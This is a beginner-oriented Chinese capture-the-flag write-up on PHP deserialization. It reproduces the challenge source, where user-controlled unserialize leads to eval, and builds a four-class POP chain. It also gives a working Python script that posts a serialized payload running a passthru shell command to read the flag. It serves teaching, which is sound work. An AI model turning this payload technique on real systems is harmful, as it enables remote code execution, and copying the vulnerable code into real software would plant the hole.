# PHP反序列化漏洞新手详解 WriteUp

## 题目信息
- **题目名称**: unser2
- **题目类型**: Web安全 - PHP反序列化漏洞

### 什么是PHP反序列化漏洞？
PHP反序列化漏洞是一种常见的Web安全漏洞，当应用程序对用户输入的数据进行反序列化时，如果数据被恶意构造，可能导致代码执行、信息泄露等安全问题。

### 关键概念
1. **序列化**: 将对象转换为字符串的过程
2. **反序列化**: 将字符串还原为对象的过程
3. **魔术方法**: PHP中以双下划线开头的特殊方法（如`__destruct`、`__toString`等）
4. **POP链**: Property Oriented Programming，通过串联对象属性和方法调用实现攻击

## 题目分析

### 第一步：访问目标网站
访问 `http://110.42.47.169:35603/` 发现网站显示了PHP源代码。

### 第二步：源代码分析
从源代码中可以看到以下关键信息：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

// 定义了4个类：A、B、C、D
class A {
    public $tou;
    function __destruct() {
        echo $this->tou;  // 当对象销毁时执行
    }
}

class B {
    public $sjq;
    function __tostring() {
        $f = $this->sjq;
        $f();  // 调用$sjq作为函数
        return "走这条路对吗?<br>";
    }
}

class C {
    public $huoyan;
    public $jinjing;
    function __get($huo) {
        $this->huoyan = "你的火眼金睛能看清前方的道路吗?<br>";
        echo $this->huoyan->jinjing;
    }
    function __invoke() {
        $this->jinjing = "你的火眼金睛能看清前方的道路吗?<br>";
        echo $this->huoyan->jinjing;  // 访问$huoyan对象的jinjing属性
    }
}

class D {
    public $code;
    function __get($aaa) {
        echo "这前面的路的确是对的，但是feng不能让你们通过!!!<br>";
        $bbb = "0e01352028862";
        if($aaa !== $bbb && md5($bbb) == md5(md5($aaa)));  // 注意这里的分号！
        {
            echo "哦！你到这里了，但是你可以进家门吗?<br>";
            $code = str_replace("?", "", $this->code);
            eval("?>" . $this->code);  // 代码执行点！
        }
    }
}

// 反序列化入口点
$data = unserialize($_POST['ctf']);
?>
```

### 第三步：漏洞点分析

#### 关键发现1：反序列化入口
```php
$data = unserialize($_POST['ctf']);
```
这行代码直接对POST参数'ctf'进行反序列化，这是漏洞的入口点。

#### 关键发现2：代码执行点
在D类的`__get`方法中：
```php
eval("?>" . $this->code);
```
这里会执行`$this->code`中的PHP代码。

#### 关键发现3：语法错误绕过
```php
if($aaa !== $bbb && md5($bbb) == md5(md5($aaa)));
```
**重要发现**：注意`if`语句后面的分号！这意味着：
- `if`条件判断后面是空语句
- 无论条件是否满足，后面的代码块都会执行
- 这是一个语法陷阱，实际上条件检查被绕过了

## 攻击链构造

### POP链设计
我们需要构造一个调用链来最终触发D类的`__get`方法：

```
1. A对象被反序列化
2. PHP脚本结束，A对象被销毁
3. 触发A::__destruct()，输出$tou
4. $tou是B对象，被当作字符串输出
5. 触发B::__toString()，调用$sjq()
6. $sjq是C对象，被当作函数调用
7. 触发C::__invoke()，访问$huoyan->jinjing
8. 如果jinjing属性不存在，触发D::__get()
9. 执行eval()中的恶意代码
```

### 序列化格式解析
PHP序列化格式：
- `O:1:"A":1:{}` - 对象，类名长度1，类名"A"，1个属性
- `s:3:"tou"` - 字符串，长度3，内容"tou"
- `N` - NULL值

## 利用脚本详解

让我们详细分析原始的2.py脚本：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def make_payload():
    # 构造恶意PHP代码
    # 使用passthru执行系统命令，tac是反向cat（从底部开始读取）
    shell = "<?php passthru('tac /flag');exit;?>"
    
    # 计算代码长度，这在PHP序列化中非常重要
    length = len(shell)   # 35个字符
    
    # 构造序列化payload
    payload = (
        'O:1:"A":1:{'           # A类对象开始，有1个属性
          's:3:"tou";'          # 属性名"tou"，长度为3
            'O:1:"B":1:{'       # B类对象，A的$tou属性的值
              's:3:"sjq";'      # 属性名"sjq"，长度为3
                'O:1:"C":2:{'   # C类对象，B的$sjq属性的值，有2个属性
                  's:6:"huoyan";' # 属性名"huoyan"，长度为6
                    'O:1:"D":1:{' # D类对象，C的$huoyan属性的值
                      's:4:"code";' # 属性名"code"，长度为4
                      f's:{length}:"{shell}";' # 恶意代码，长度为35
                    '}'
                  's:7:"jinjing";' # 属性名"jinjing"，长度为7
                    'N;'        # NULL值，这会触发__get方法
                '}'
            '}'
        '}'
    )
    return payload

def exploit(url):
    # 构造POST数据
    data = {'ctf': make_payload()}
    
    # 打印payload用于调试
    print("[*] payload:", make_payload())
    
    # 发送POST请求
    resp = requests.post(url, data=data, timeout=5)
    
    # 打印响应内容
    print(resp.text)

if __name__ == '__main__':
    # 攻击目标
    exploit('http://110.42.47.169:35603/')
```

## 攻击步骤详解

### 步骤1：构造恶意代码
```php
<?php passthru('tac /flag');exit;?>
```
- `passthru()`: 执行系统命令并直接输出结果
- `tac /flag`: 反向读取/flag文件内容
- `exit;`: 退出PHP执行，防止后续代码影响

### 步骤2：构造序列化对象
按照POP链的顺序构造嵌套对象：
- A对象包含B对象
- B对象包含C对象
- C对象包含D对象和NULL值

### 步骤3：发送攻击请求
通过POST请求发送序列化数据到目标服务器。

### 步骤4：触发漏洞
1. 服务器反序列化我们的数据
2. 创建A、B、C、D对象
3. 脚本结束时，A对象被销毁
4. 触发整个调用链
5. 最终在D类中执行恶意代码

## 结果分析

运行脚本后，我们得到了flag：
```
flag{00094a26c22cc47343fd5a5636fbbdac}
```


